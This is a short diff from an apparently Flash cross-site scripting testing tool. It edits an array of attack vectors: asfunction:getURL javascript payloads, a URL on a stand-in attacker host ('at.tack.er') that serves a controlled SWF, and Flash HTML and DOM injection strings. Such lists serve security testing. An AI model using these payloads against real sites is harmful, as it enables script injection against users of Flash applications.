@@ -18,7 +18,8 @@ var evilsite="http://at.tack.er/";
 **  use |NAME|.
 */
 var attackVector=['asfunction:getURL,javascript:gotRoot("|NAME|")///d.jpg', // Direct load 
-		  evilsite+'xss.swf?|NAME|',  // controlled Evil Page
+		 // the '!' char is used to separate the affected parameter in gotRoot function
+		  evilsite+'xss.swf?!|NAME|',  // controlled Evil Page
 		  evilsite, // Controlled evil Host
 		  "\x22\x27><img src='asfunction:getURL,javascript:gotRoot(\x22|NAME|\x22)//.jpg\x27 >dss", // Flash Html Injection
 		  "(gotRoot(\x22|NAME|\x22))", // Dom Injection
